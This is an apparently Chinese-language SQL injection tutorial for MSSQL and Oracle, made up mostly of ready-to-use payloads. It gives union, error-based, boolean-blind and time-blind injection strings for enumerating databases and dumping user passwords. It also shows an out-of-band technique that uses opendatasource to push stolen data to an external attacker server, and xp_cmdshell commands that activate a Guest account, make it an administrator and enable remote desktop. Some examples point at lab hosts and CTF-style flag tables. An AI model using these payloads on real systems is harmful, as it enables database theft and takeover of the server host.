# MSSQL

## MSSQL基础扩展

> **MSSQL系统自带库和表**

- 系统自带库
- MSSQL安装后默认带了6个数据库，其中4个系统级库：master，model，tempdb和msdb；2个示例库：NorthwindTraders和pubs。

| **系统级自带库** | **功能**                                                     |
| :--------------- | :----------------------------------------------------------- |
| master           | 系统控制数据库，包含所有配置信息，用户登录信息，当前系统运行情况 |
| model            | 模板数据库，数据库时建立所有数据库的模板。                   |
| tempdb           | 临时容器，保存所有的临时表，存储过程和其他程序交互的临时文件 |
| msdb             | 主要为用户使用，记录着计划信息、事件处理信息、数据备份、警告以及异常信息 |

- 系统视图表
- MSSQL数据库与MYSQL数据库一样，有安装自带数据表sysobjects和syscolumns等，我们需要了解

| **视图表**                     | **功能**                                              |
| :----------------------------- | :---------------------------------------------------- |
| sysobjects                     | 记录了数据库中所有表，常用字段为id、name和xtype       |
| syscolumns                     | 记录了数据库中所有表的字段，常用字段为id、name和xtype |
| **sys.databases**              | SQL Server 中所有的数据库                             |
| sys.sql_logins                 | SQL Server 中所有的登录名                             |
| **information_schema.tables**  | 当前用户数据库的表                                    |
| **information_schema.columns** | 当前用户数据库的列                                    |
| sys.all_columns                | 用户定义和系统对象的所有列的联合                      |
| sys.database_principals        | 数据库中每个权限或列异常权限                          |
| sys.database_files             | 存储在数据库中数据库文件                              |

> **MSSQL权限控制**

- 服务器角色

![img](MSSQL%E5%92%8Coracle%E6%B3%A8%E5%85%A5.assets/2173462-20211120222215151-2072520034.png)

| **最高服务器角色** | **说明**                    |
| :----------------- | :-------------------------- |
| **sysadmin**       | 执行 SQL Server中的任何动作 |

```
# 我们可以通过语句判断权限:
and 1=(select is_srvrolemember('sysadmin'))--+
```

- 数据库角色

![img](MSSQL%E5%92%8Coracle%E6%B3%A8%E5%85%A5.assets/2173462-20211120222215897-716154447.png)

| **最高数据库角色** | **说明**                       |
| :----------------- | :----------------------------- |
| **db_owner**       | 可以执行数据库中所有动作的用户 |

```
# 我们可以通过语句判断权限:
and 1=(select is_member('db_owner'))--+
```

> **MSSQL常用语句**

```
# 创建数据库
create database [dbname];
create database test;

# 删除数据库
drop database [dbname];
drop database test;

# 创建新表
create table table_name (name char(10),age tinyint,sex int);
# 创建新表前要选择数据库，默认是master库 
use test; 
create table admin (users char(255),passwd char(255),sex int);

# 删除新表
drop table table_name;
drop table dbo.admin;

# 向表中插入数据
insert into table_name (column1,column2) values(value1,value2);
insert into admin (users,passwd,sex) values('admin','admin',1);

# 删除内容
delete from table_name where column1=value1;
delete from admin where sex=2;

# 更新内容
update table_name set column2=”xxx” where column1=value1;
update admin set users='admintest' where sex=2;

# 查找内容
select * from table_name where column1=value1;
select passwd from admin where users='admin';
```

- 排序&获取下一条数据
  - MSSQL数据库中没有limit排序获取字段，但是可以使用top 1来显示数据中的第一条数据，
  - 使用 <> 来排除已经显示的数据，获取下一条数据。
  - 使用not in来排除已经显示的数据，获取下一条数据。

```
# 使用<>获取数据
id=-2 union select top 1 1,id,name from dbo.syscolumns where id='5575058' and name<>'id' and name<>'username'--+
# 使用not in获取数据
id=-2 union select top 1 1,table_name from information_schema.tables where table_name not in(select top 1 table_name from information_schema.tables)--+
id=-2 union select top 1 1,id,name from dbo.syscolumns where id='5575058' and name not in('id','username')--+
```

> **MSSQL 注释**

```
单行 --空格
多行 /**/
```

### 常用函数总结

| **名称**              | **功能**                                                     |
| :-------------------- | :----------------------------------------------------------- |
| suser_name()          | 用户登录名                                                   |
| user_name()           | 用户在数据库中的名字                                         |
| user                  | 用户在数据库中的名字                                         |
| db_name()             | 数据库名                                                     |
| @@version             | 返回SQL服务器版本相关信息                                    |
| quotename()           | 在存储过程中，给列名、表名等加个[]、’’等以保证sql语句能正常执行 |
| WAITFOR DELAY '0:0:n' | '时:分:秒'，WAITFOR DELAY '0:0:5'表示等待5秒后执行           |
| substring()           | 截取字符串 substr(字符串，开始截取位置，截取长度) ，例如substring('abcdef',1,2) 表示从第一位开始，截取2位，即 'ab' |



## 常见注入类型

### union联合查询注入

```
**1.判断注入点及类型** 
?id=1' and 1=1--+
?id=1' and 1=2--+
# 那么此处是字符型注入，需要单引号闭合

**2.判断字段数** 
?id=1' order by 3--+
?id=1' order by 4--+

**3.联合查询判断回显点** 
?id=0' union select 1,2,3--+

**4.获取当前数据库名字和版本信息** 
?id=0' union select 1,db_name(),@@version--+

**5.获取所有的数据库名** 
?id=0' union select 1,db_name(),name from master.sys.databases where name not in(select top 1 name 
from master.sys.databases)--+

**6.获取所有的表名** 
?id=0' union select top 1 1,2,table_name from information_schema.tables where table_name not in
(select top 1 table_name from information_schema.tables)--+

**7.获取所有的字段名** 
?id=0' union select top 1 1,2,column_name from information_schema.columns where column_name not in
(select top 1 column_name from information_schema.columns)--+

?id=0' union select top 1 1,2,column_name from information_schema.columns where table_name='users' and 
column_name not in(select top 2 column_name from information_schema.columns where table_name='users')--

**8.获取users表账号密码信息** 
?id=0' union select top 1 1,username,password from users--+
```

### error 注入

- MSSQL数据库是强类型语言数据库，当类型不一致时将会报错，配合子查询即可实现报错注入。



```
**1.判断注入点** 
id=1

**2.判断是否为MSSQL数据库** 
# 返回正常为MSSQL
id=1 and exists(select * from sysobjects)
id=1 and exists(select count(*) from sysobjects)

**3.判断数据库版本号** 
id=1 and @@version>0--+
# @@version是mssql的全局变量，@@version>0执行时转换成数字会报错，也就将数据库信息暴露出来了
# 版本号：nt5.2:2003 nt6.0:2008

**4.获取当前数据库名** 
and db_name()>0--+
and 1=db_name()--+
# 报错注入的原理就是将其他类型的值转换层int型失败后就会爆出原来语句执行的结果

**5.判断当前服务器拥有的权限** 
and 1=(select IS_SRVROLEMEMBER('sysadmin'))--+
and 1=(select IS_SRVROLEMEMBER('serveradmin'))--+
and 1=(select IS_SRVROLEMEMBER('setupadmin'))--+
and 1=(select IS_SRVROLEMEMBER('securityadmin'))--+
and 1=(select IS_SRVROLEMEMBER('diskadmin'))--+
and 1=(select IS_SRVROLEMEMBER('bulkadmin'))--+

**6.判断当前角色是否为DB_OWNER** 
and 1=(select is_member('db_owner'))--+
# db_owner权限可以通过备份方式向目标网站写文件

**7.获取当前用户名** 
and user_name()>0--+

8,获取所有数据库名
and (select name from master.sys.databases where database_id=1)>0--+
# 更改database_id的值来获取所有的数据库

**9.获取数据库的个数** 
and 1=(select quotename(count(name)) from master.sys.databases)--+
**
10.一次性获取所有数据库库** 
and 1=(select quotename(name) from master.sys.databases for xml path(''))--+

**11.获取所有的表名** 
# 获取当前库第一个表
and 1=(select top 1 table_name from information_schema.tables)--+
# 获取当前库第二个表
and 1=(select top 1 table_name from information_schema.tables where table_name not in('emails'))--+
# 获取当前库第三个表
and 1=(select top 1 table_name from information_schema.tables where table_name not in('emails','uagents'))--+
# 也可通过更改top 参数获取表
and 1=(select top 1 table_name from information_schema.tables where table_name not in
(select top 5 table_name from information_schema.tables))--+
# quotename和for xml path('')一次性获取全部表
and 1=(select quotename(table_name) from information_schema.tables for xml path(''))--+
# quotename()的主要作用就是在存储过程中，给列名、表名等加个[]、’’等以保证sql语句能正常执行。

**12.获取字段名** 
# 通过top 和 not in 获取字段
and 1=(select top 1 column_name from information_schema.columns where table_name='users')--+
and 1=(select top 1 column_name from information_schema.columns where table_name='users' and column_name not in ('id','username'))--+
# 通过quotename 和 for xml path('') 获取字段
and 1=(select quotename(column_name) from information_schema.columns where table_name='emails' for xml path(''))--+

**13.获取表中数据** 
and 1=(select quotename(username) from users for xml path(''))--+
and 1=(select quotename(password) from users for xml path(''))--+
```

### bool盲注

```sql
**1.** **判断注入点 ** 
and 1=1 and 1=2 and '1'='1' and '1456'='1456'--+

**2.猜解数据库个数** 
id=1 and (select count(*) from sys.databases)=7--+        # 存在7个数据库

**3.猜解数据库名长度** 
id=1 and len((select top 1 name from sys.databases))=6--+ # 第一个库名长度为6
id=1 and len(db_name())=4--+                              # 当前数据库名长度为4

**4.猜解数据库名** 
id=1 and ascii(substring(db_name(),1,1))=115--+ # 截取库名第一个字符的ascii码为115——s
id=1 and ascii(substring(db_name(),2,1))=113--+ # 截取库名第二个字符的ascii码为113——q
# 截取第一个库名第一个字符的ascii码为109——m
id=1 and ascii(substring((select top 1 name from sys.databases),1,1))=109--+
# 截取第二个库名第一个字符的ascii码为105——i
id=1 and ascii(substring((select top 1 name from sys.databases where name not in ('master')),1,1))=105--+ 

**5.猜解表名** 
# 截取当前库的第一个表的第一个字符的ascii码为101——e
id=1 and ascii(substring((select top 1 table_name from information_schema.tables),1,1))=101--+ 
# 截取当前库的第二个表的第一个字符的ascii码为117——u
id=1 and ascii(substring((select top 1 table_name from information_schema.tables where table_name not in ('emails')),1,1))=117--+

**6.猜解字段名 ** 
# 截取当前库的emails表的第一个字符的ascii码为105——i
id=1 and ascii(substring((select top 1 column_name from information_schema.columns where table_name='emails'),1,1))=105--+
#截取当前库的emails表的第二个字符的ascii码为100——d 
id=1 and ascii(substring((select top 1 column_name from information_schema.columns where table_name='emails'),2,1))=100--+ 

**7.猜解表中数据** 
# username字段的数据第一个字符为D
id=1 and ascii(substring((select top 1 username from users),1,1))=68--+
```

### time 盲注

```
**1.判断是否存在注入** 
id=1 WAITFOR DELAY '0:0:5'--+

**2.判断权限** 
# 如果是sysadmin权限，则延时5秒
id=1 if(select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'--+

**3.查询当前数据库的长度和名字** 
# 二分法查询长度
id=1 if(len(db_name()))>40 WAITFOR DELAY '0:0:5'--+
# 查询数据库名字
# substring截取字符串的位置，用ascii转为数字进行二分法查询
id=1 if(ascii(substring(db_name(),1,1)))>50 WAITFOR DELAY '0:0:5'--+

**4.查询数据库的版本** 
id=1 if(ascii(substring((select @@version),1,1))=77 WAITFOR DELAY '0:0:5'--+ # ascii 77 = M

**5.查询表个数** 
id=1 if((select count(*) from SysObjects where xtype='u')>5) WAITFOR DELAY '0:0:5'--+
# 当前数据库表的个数为6

**6.查询第一个表的长度** 
# 查询第一个表
id=1 and select top 1 name from SysObjects where xtype='u' 
# 查询结果为1
(select count(*) from SysObjects where name in (select top 1 name from SysObjects where xtype='u')
# 利用and，进行判断，9为表长度的猜测
and len(name)=9
# 第一个表名长度为6
id=1 if((select count(*) from SysObjects where name in (select top 1 name from SysObjects where xtype='u') and len(name)=9)=1) WAITFOR DELAY '0:0:5'--+
id=1 if((select count(*) from SysObjects where name in (select top 1 name from SysObjects where xtype='u') and len(name)=6)=1) WAITFOR DELAY '0:0:10'--+

**7.查询第一个表的表名** 
id=1 if((select count(*) from SysObjects where name in (select top 1 name from SysObjects where xtype='u') and ascii(substring(name,1,1))>90)=1) WAITFOR DELAY '0:0:5'--+
id=1 if((select count(*) from SysObjects where name in (select top 1 name from SysObjects where xtype='u') and ascii(substring(name,1,1))=101)=1) WAITFOR DELAY '0:0:5'--+

**8.查询第二个表的长度** 
# 查询第一个表名，去除emails, emails为第一个表名
select top 1 name from SysObjects where xtype='u' and name not in ('emails')
# 同理，第三个表则 and name not in ('emails','uagents')
id=1 if((select count(*) from SysObjects where name in (select top 1 name from SysObjects where xtype='u' and name not in ('emials')) and len(name)=6)<>0) WAITFOR DELAY '0:0:5'--+

**9.查询第二个表的名字** 
id=1 if((select count(*) from SysObjects where name in (select top 1 name from SysObjects where xtype='u' and name not in ('emails')) and ascii(substring(name,1,1)>100)!=1) WAITFOR DELAY '0:0:5'--+
id=1 if((select count(*) from SysObjects where name in (select top 1 name from SysObjects where xtype='u' and name not in ('emails')) and ascii(substring(name,1,1)>100)!=0) WAITFOR DELAY '0:0:5'--+

**10.查询第一个表中的字段** 
# and name not in ('')查询第二个字段的时候可以直接在其中，排除第一个字段名
id=1 if((select count(*) from syscolumns where name in (select top 1 name from syscolumns where id = object_id('emails') and name not in ('')) and ascii(substring(name,1,1))=1)！=0) WAITFOR DELAY '0:0:1'--+

**11.查询字段类型** 
id=1 if((select count(*) from information_schema.columns where data_type in(select top 1 data_type from information_schema.columns where table_name ='emails') and ascii(substring(data_type,1,1))=116)!=0) WAITFOR DELAY '0:0:5'--+

**12.查询数据** 
# 查询所有数据库
SELECT Name FROM Master..SysDatabases ORDER BY Name
# 查询存在password字段的表名
SELECT top 1 sb.name FROM syscolumns s JOIN sysobjects sb ON s.id=sb.id WHERE s.name='password'
id=1 if((select count(*) from sysobjects where name in ((select name from sysobjects where name in (SELECT top 1 sb.name FROM syscolumns s JOIN sysobjects sb ON s.id=sb.id WHERE s.name='password') and ascii(substring(sysobjects.name,1,1))>1)))>0) waitfor delay '0:0:1'--
# 查询包含pass的字段名
SELECT top 1 name FROM SysColumns where name like '%pass%'
id=1 if((select count(*) from SysColumns where name in (SELECT top 1 name FROM SysColumns where name like '%pass%' and ascii(substring(name,1,1))>1))>0) waitfor delay '0:0:1'--
```

### 反弹注入

- 就像在Mysql中可以通过dnslog外带，Oracle可以通过python搭建一个http服务器接收外带的数据一样，在MSSQL数据库中，我们同样有方法进行数据外带，那就是通过反弹注入外带数据。
- 反弹注入条件相对苛刻一些，一是需要一台搭建了mssql数据库的vps服务器，二是需要开启堆叠注入。
- 反弹注入需要使用opendatasource函数。

> **OPENDATASOURCE函数**

- OPENDATASOURCE(provider_name,init_string)
- 使用opendatasource函数将当前数据库查询的结果发送到另一数据库服务器中。

> **反弹注入一般流程**

1. 连接vps的mssql数据库，新建表test，字段数与类型要与要查询的数据相同。这里因为我想查询的是数据库库名，所以新建一个表里面只有一个字段，类型为varchar。

```
CREATE TABLE test(name VARCHAR(255))
```

2. 获取数据库所有表

    使用反弹注入将数据注入到表中，注意这里填写的是数据库对应的参数，最后通过空格隔开要查询的数据。

```
# 查询sysobjects表
?id=1;insert intoopendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select namefrom dbo.sysobjects where xtype='U' --+

# 查询information_schema数据库
?id=1;insert intoopendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test selecttable_name from information_schema.tables--+ 
```

    在数据库成功获取数据

![img](MSSQL%E5%92%8Coracle%E6%B3%A8%E5%85%A5.assets/2173462-20211120222216202-1518656758.png)

3. 获取数据库admin表中的所有列名

```
# 查询information_schema数据库
id=1;insert intoopendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test selectcolumn_name from information_schema.columns where table_name='admin'--+

# 查询syscolumns表
id=1;insert intoopendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select namefrom dbo.syscolumns where id=1977058079--+
```

![img](MSSQL%E5%92%8Coracle%E6%B3%A8%E5%85%A5.assets/2173462-20211120222216456-979118597.png)

4. 获取数据

    1. 首先新建一个表，里面放三个字段，分别是id，username和passwd。

```
CREATE TABLE data(id INT,username VARCHAR(255),passwd VARCHAR(255))
```

    2. 获取admin表中的数据

```
id=1;insert intoopendatasource('sqloledb','[server=SQL5095.site4now.net](http://server=SQL5095.site4now.net),1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.data selectid,username,passwd from admin--+
```

![img](MSSQL%E5%92%8Coracle%E6%B3%A8%E5%85%A5.assets/2173462-20211120222216665-1285136377.png)

## 扩展存储过程

**在SQL注入攻击过程中，最常利用到的扩展存储**

| **扩展存储过程**     | **说明**                                                     |
| :------------------- | :----------------------------------------------------------- |
| xp_cmdshell          | 直接执行系统命令                                             |
| sp_OACreate()        | 直接执行系统命令                                             |
| sp_OAMethod()        | 直接执行系统命令                                             |
| xp_regread           | 进行注册表读取                                               |
| xp_regwrite          | 写入到注册表                                                 |
| xp_dirtree           | 进行列目录操作                                               |
| xp_ntsec_enumdomains | 查看domain信息                                               |
| xp_subdirs           | 通过xp_dirtree，xp_subdirs将在一个给定的文件夹中显示所有子文件夹 |

xp_cmdshell默认在** mssql2000中是开启** 的，在**mssql2005之后的版本中则默认禁止** 。如果用户拥有管理员**sysadmin** 权限则可以用** sp_configure重新开启**它

```
execute('sp_configure "show advanced options",1')  # 将该选项的值设置为1
execute('reconfigure')                             # 保存设置
execute('sp_configure "xp_cmdshell", 1')           # 将xp_cmdshell的值设置为1
execute('reconfigure')                             # 保存设置
execute('sp_configure')                            # 查看配置
execute('xp_cmdshell "whoami"')                    # 执行系统命令

exec sp_configure 'show advanced options',1;       # 将该选项的值设置为1
reconfigure;                                       # 保存设置
exec sp_configure 'xp_cmdshell',1;                 # 将xp_cmdshell的值设置为1
reconfigure;                                       # 保存设置
exec sp_configure;                                 # 查看配置
exec xp_cmdshell 'whoami';                         # 执行系统命令

# 可以执行系统权限之后,前提是获取的主机权限是administrators组里的或者system权限
exec xp_cmdshell 'net user Guest 123456'           # 给guest用户设置密码
exec xp_cmdshell 'net user Guest /active:yes'      # 激活guest用户
exec xp_cmdshell 'net localgroup administrators Guest /add'  # 将guest用户添加到administrators用户组
exec xp_cmdshell 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'  # 开启3389端口
```

# Oracle SQL

## Oracle基础扩展

> **Oracle数据库基本表管理语句**

```
创建表
create table 表名(字段名称 类型 约束)
create table ichunqiu(name char(10) primary key,age int)

增加列
alter table 表名 add(字段名称, 数据类型)
alter table ichunqiu add(class_name varchar2(200))

删除表中一列
alter table 表名 set unused column 列名
alter table ichunqiu set unused column name

修改表字段
alter table 表名 modify(字段名称 新的字段类型)
alter table ichunqiu modify(name varchar(200))
```

> **Oracle数据库基本数据操作语句**

```
**查询** 
select *|列名|表达式 from 表名 where 条件 order by 列名
select * from ichunqiu order by age desc  (降序)
select * from ichunqiu order by age asc   (升序)
select * from ichunqiu order by age       (默认就是升序)

**插入** 
insert into 表名 values(所有字段对应值)
insert into 表名 (字段名1,字段名2,字段名3,...)values(字段对应值)
insert into ichunqiu(name,age) values('icq',18)
insert into ichunqiu values('icq',18,'web')

**更新** 
update 表名 set 字段名称 = 值 where 更新条件
update ichunqiu set age=25 where name='icq'

**删除** 
delete 表名 where 条件
delete ichunqiu where name='ii'
```

- **Truncate**
- 语法：truncate table 表名
- 说明：将表中数据一次性删除
- Truncate和 delete区别

1. truncate是DDL命令，**删除数据不能恢复** ; delete是DML命令，删除数据可以通过数据库的日志文件进行恢复
2. 如果一个表中记录很多, truncate相对 delete速度快

### Oracle权限控制

> **Oracle权限概述**

- 权限允许用户访问属于其它用户的对象或执行程序，ORACLE系统提供三种权限: Object对象级、 System系统级、Role角色级。这些权限可以授予给用户、特殊用户 public或角色，如果授予一个权限给特殊用户"Public" (用户 public是 oracle预定义的，每个用户享有这个用户享有的权限)那么就意味作将该权限授予了该数据库的所有用户。
- 对管理权限而言，角色是一个工具,权限能够被授予给—个角色，角色也能被授予给另一个角色或用户。用户可以通过角色继承权限,除了管理权限外角色服务没有其它目的。权限可以被授予,也可以用同样的方式撤销

> **权限分类**

- Oracle数据库中权限分为两类

1. 系统权限：系统规定用户使用数据库的权限。(系统权限是对用户而言)
2. 实体权限：某种权限用户对其它用户的表或视图的存取权限。(是针对表或视图而言的)

> **系统权限（用户权限管理）**

- 系统权限分类
- **DBA：拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构**
- RESOURCE：拥有 Resource权限的用户只可以创建实体，不可以创建数据库结构
- CONNECT：拥有 Connect权限的用户只可以登录 Oracle，不可以创建实体，不可以创建数据库结构
- 对于普通用户：授予 connect, resource权限
- 对于DBA管理用户：授予 connect, resource,dba权限

> **系统权限授权命令**

- 系统权限只能由DBA用户授出：sys, system(最开始只能是这两个用户)

```
SQL> grant connect,resource,dba to用户名1[,用户名2]...;

SQL> Create user user50 identified by user50;
SQL> grant connect,resource to user50;
```

注：普通用户通过授权可以具有与 system相同的用户权限，但不能达到与sys用户相同的权限, system用户的权限也可以被回收。

> **实体权限（表权限管理）**

- 实体权限分类
- select, update, insert, alter, index, delete,all //all括所有权限
- execute //执行存储过程权限
- 举例:

```
grant select,insert, update on tablename to userA;            --赋权给用户: userA
grant select, insert, update on tablename to public:          --赋权给所有用户
grant select, update on product to userA with grant option;   --userA得到权限,并可以传递
revoke select insert, update on tablename from userA;         --收回给予的权限从用户
userA revoke select, insert, update on tablename from public; --收回给予的权限从所有用户
```

注意：如果取消某个用户的对象权限，那么对于这个用户使用 WITH GRANT OPTION授予权限的用户来说，同样还会取消这些用户的相同权限，也就是说取消授权时级联的

## 常见注入类型

### union联合查询注入

> **Oracle union联合查询注入基本流程**

```
**1.判断是否存在注入** 
http://172.16.12.2:81/orcl.php?id=1' " and 1=1 and '1'='1' or '1'='1'

**2.判断字段数** 
当前表有4个字段
id=1 order by 4--   

**3.联合查询找回显位** 
Oracle 数据库查询需要 from dual (虚表/伪表) 专为查询语句设置的表
union select * from dual--
id=1 union select 1,2,3,4 from dual--
null代替所有类型
id=1 union select null,null,null,null from dual--
id=1 union select 1,'admin',3,4 from dual--

**4.查询数据库版本、数据库连接用户、当前实例名** 
id=1 union select 1,(select banner from sys.v_$version where rownum=1),3,4 from dual--
id=1 union select 1,(select SYS_CONTEXT('USERENV','CURRENT_USER') from dual),3,4 from dual-- #test
id=-1 union select 1,(select instance_name from v$instance),3,4 from dual--

**5.遍历数据库名** 
id=-1 union select 1,(select owner from all_tables where rownum=1),3,4 from DUAL--
id=-1 union select 1,(select owner from all_tables where rownum=1 and owner not in ('SYS')),3,4 from DUAL--
id=-1 union select 1,(select owner from all_tables where rownum=1 and owner not in('SYS','OUTLN','SYSTEM')),3,4 from DUAL--

**6.遍历表名** 
id=-1 union select 1,(select table_name from user_tables where rownum=1 and table_name not in ('ADMIN1','DEMO','FLAG','ICHUNQIU','STU')),3,4 from DUAL--

**7.遍历flag表字段名** 
id=-1 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name='FLAG' AND column_name not in ('id','name','pwd','flag')),3,4 from DUAL--

**8.查询表字段数据** 
id=-1 union select 1,(select NAME||AGE FROM DEMO where rownum=1),3,4 from dual--
id=-1 union select 1,(select "name"||"age" FROM DEMO where rownum=1),3,4 from dual--
id=-1 union select 1,(select 'username:'||NAME||'age:'||AGE FROM DEMO where rownum=1),3,4 from dual--
```

### error 注入

> **常用显错函数**

1. **dbms_xdb_version.checkin()** **函数**

- 属于 dbms_xdb_version下的 checkin功能。此功能检入签岀的VCR并返回新创建的版本的资源ID。
- payload:

```
and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null--
```

1. **dbms_xdb_version.uncheckout()** **函数**

- 用法和checkin一致
- payload:

```
and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null--
```

1. **utl_inaddr.get_host_name() ** **函数**

- 说明：这种方法在 Oracle 8g,9g,10g中不需要任何权限，但是在** Oracle 11g及以后的版本中** ，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有**网络访问权限**
- 报错方法：获取ip地址，其参数如果解析不了会报错，显示传递的参数。如果其参数是一个SQL语句，那么报错就会把结果给显示出来。
- payload:

```
and utl_inaddr.get_host_name((select user from dual))=1--
```

> **其他常用显错函数**

| **函数名**                         | **payload**                                                  |
| :--------------------------------- | :----------------------------------------------------------- |
| dbms_xdb_version.makeversioned()   | and (select **dbms_xdb_version.makeversioned** ((select user from dual)) from dual) is not null-- |
| dbms_utility.sqlid_to_sqlhash()    | and (select **dbms_utility.sqlid_to_sqlhash** ((select user from dual)) from dual) is not null-- |
| ordsys.ord_dicom.getmappingxpath() | and select **ordsys.ord_dicom.getmappingxpath** ((select user from dual),user,user) =1-- |
| ctxsys.drithsx.sn()                | and (select **ctxsys.drithsx.sn** ((select user from dual)) from dual) =1-- |

> **Oracle error 注入基本流程**



highlighter- csharp

```
**1.判断是否存在注入** 
http://172.16.12.2:81/orcl.php?id=1' " and 1=1 and '1'='1' or '1'='1'

2.**查询数据库版本、数据库连接用户、当前实例名** 
id=1 and dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1)) is not null--
id=1 and dbms_xdb_version.checkin((select SYS_CONTEXT('USERENV','CURRENT_USER') from dual)) is not null--
id=1 and dbms_xdb_version.checkin((select instance_name from v$instance)) is not null--

2.**遍历获取数据库名** 
id=1 and dbms_xdb_version.checkin((select owner from all_tables where rownum=1)) is not null--
id=1 and dbms_xdb_version.checkin((select owner from all_tables where rownum=1 and owner not in ('SYS'))) is not null--

3.**遍历获取表名** 
id=1 and dbms_xdb_version.checkin((select table_name from user_tables where rownum=1)) is not null--
id=1 and dbms_xdb_version.checkin((select table_name from user_tables where rownum=1 and table_name not in ('ADMIN1','DEMO'))) is not null--

**4.遍历获取字段名** 
id=1 and dbms_xdb_version.checkin((select column_name from user_tab_columns where rownum=1 and table_name='FLAG' AND column_name not in ('id','name','pwd','flag'))) is not null--

5.**查询表字段数据** 
id=1 and dbms_xdb_version.checkin((select NAME||AGE FROM DEMO where rownum=1)) is not null--
id=1 and dbms_xdb_version.checkin((select "name"||"age" FROM DEMO where rownum=1)) is not null--
id=1 and dbms_xdb_version.checkin((select 'username:'||NAME||'age:'||AGE FROM DEMO where rownum=1)) is not null--
```

### bool盲注

> **bool盲注相关函数**

1. **decode()函数**

- **用法** ：decode(条件,值1，翻译值1，值2，翻译值2… 值n, 翻译值n，缺省值)
- **含义** ：if(条件 == 值1) -> 返回翻译值1，否则返回默认值
- **举例** ：查询 Oracle版本,判断版本的字符串第一个字符是否是O
- **Payload** :

```
and 1=(select decode(substr((select banner from sys.v_$Version where rownum=1),1,1), 'O', 1, 0) from dual--
```

- **说明** ：其中 select语句可以替换，如:
- 获取当前用户: selectuser from dual;
- 获取字符长度: select length(user) from dual;

1. **instr()** ** 函数**

- **用法** ：instr( string1, string2 ) / instr(源字符串,目标字符)
- **含义** ：搜索指定的字符返回发现指定的字符的位置, string1是被搜索的字符串, string2是希望搜索的字符串
- **注入思路** : instr会返回’SQL’位置数据在査询结果中的位置，未找到便返回0，可通过对‘SQL′位置进行遍历和迭代,获取到数据
- **举例** ：查询当前的用户，判断用户名第一个字符是否是T
- **Payload** ：

```
and 1=(instr((select user from dual),'T'))--
```

> **Oracle bool盲注基本流程**

```
**1.判断注入** 
http://172.16.12.2:81/orcl.php?id=1' " and 1=1 and '1'='1' or '1'='1'

2.**查询数据库版本/用户** 
decode decode(substr(('abc'),1,1),'a',1,0)
length 返回字符串长度
ascii  返回字符的ascii码
instr  搜索指定结果内是否包含关键字 存在返回1 否则返回0
id=1 and 1=(select decode(substr((select banner from sys.v_$version where rownum=1),1,1),'O',1,0) from dual)--
id=1 and (select length(user) from dual)=4-- 
id=1 and (select ascii('a') from dual)=97-- 
id=1 and (select ascii(substr((select user from dual),1,1)) from dual)=84-- #ascii码判断字符 T
id=1 and (select ascii(substr((select user from dual),2,1)) from dual)=69-- #ascii码判断字符 E

id=1 and 1=(instr((select user from dual),'T'))--
id=1 and 1=(instr((select user from dual),'TE'))--
id=1 and 1=(instr((select user from dual),'TES'))--
id=1 and 1=(instr((select user from dual),'TEST'))--

**3.获取库名** 
id=1 and (select length(owner) from all_tables where rownum=1)=3-- #第一个库名长度为3
id=1 and (select ascii(substr((select owner from all_tables where rownum=1),1,1)) from dual)=83--
#ascii为83 S
id=1 and (select ascii(substr((select owner from all_tables where rownum=1),2,1)) from dual)=89--
#ascii为89 Y
id=1 and (select ascii(substr((select owner from all_tables where rownum=1),3,1)) from dual)=83--
#ascii为83 S

**4.获取表名** 
id=1 and (select ascii(substr((select table_name from user_tables where rownum=1),1,1)) from dual)=105-- 第一个表名的第一个字符是i
id=1 and (select ascii(substr((select table_name from user_tables where rownum=1),2,1)) from dual)=99-- 第一个表名的第二个字符是c

**5.获取字段名** 
id=1 and (select ascii(substr((select column_name from user_tab_columns where rownum=1 and table_name='icq'),1,1)) from dual)=117-- icq表内的第一个字段的第一个字符u
id=1 and (select ascii(substr((select column_name from user_tab_columns where rownum=1 and table_name='icq'),2,1)) from dual)=115-- icq表内的第一个字段的第二个字符s
```

### time 盲注

> **time盲注相关函数**

- **DBMS_PIPE.RECEIVE_MESSAGE()** ** 函数**
- **用法** ：DBMS_PIPE.RECEIVE_MESSAGE(**'** **任意值** **',** **延迟时间** )
- **举例** ：DBMS_PIPE.RECEIVE_MESSAGE('ICQ',5) 表示从ICQ管道返回的数据需要等待5秒
- **payload** ：

```
and DBMS_PIPE.RECEIVE_MESSAGE('ICQ',5)=1
```

> **常用payload**

```
id=1 and dbms_pipe.receive_message((), 5)=1
id=1 and (select decode(substr((select banner from sys.v_$version where rownum=1),1,1),'O', dbms_pipe.receive_message('ICQ', 5),0) from dual)=1--
截取数据库版本第一个字符为O就延时5s
id=1 and (select decode(length(user),4,dbms_pipe.receive_message('ICQ', 5),0) from dual)=1--
用户名长度为4 就延时5s
```

## 带外注入

